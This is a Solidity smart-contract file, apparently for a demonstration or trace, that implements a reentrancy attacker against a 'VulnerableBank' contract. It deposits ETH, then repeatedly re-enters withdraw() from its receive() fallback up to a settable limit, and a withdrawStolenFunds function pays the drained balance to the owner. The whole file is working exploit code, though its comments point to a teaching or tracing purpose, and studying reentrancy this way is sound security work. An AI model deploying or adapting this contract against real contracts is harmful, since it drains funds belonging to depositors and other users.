// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker2 {
    IVulnerableBank public immutable target;
    address public owner;
    uint256 public attackCount;
    uint256 public MAX_ATTACKS ; // caps the reentrancy depth for a clean, bounded trace

    constructor(address _target) {
        target = IVulnerableBank(_target);
        owner = msg.sender;
    }

     function setMaxAttacks(uint256 _maxAttacks) public {
        MAX_ATTACKS = _maxAttacks;
    }
    // Kicks off the attack: deposit, then trigger the first withdraw
    function attack() external payable {
        require(msg.value > 0, "Send ETH to attack with");
        attackCount = 0;
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    // Re-enters withdraw() every time this contract receives ETH,
    // up to MAX_ATTACKS times - this is what generates the nested
    // CALL frames in the trace.
    receive() external payable {
        if (attackCount < MAX_ATTACKS) {
            attackCount++;
            target.withdraw();
        }
    }

    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}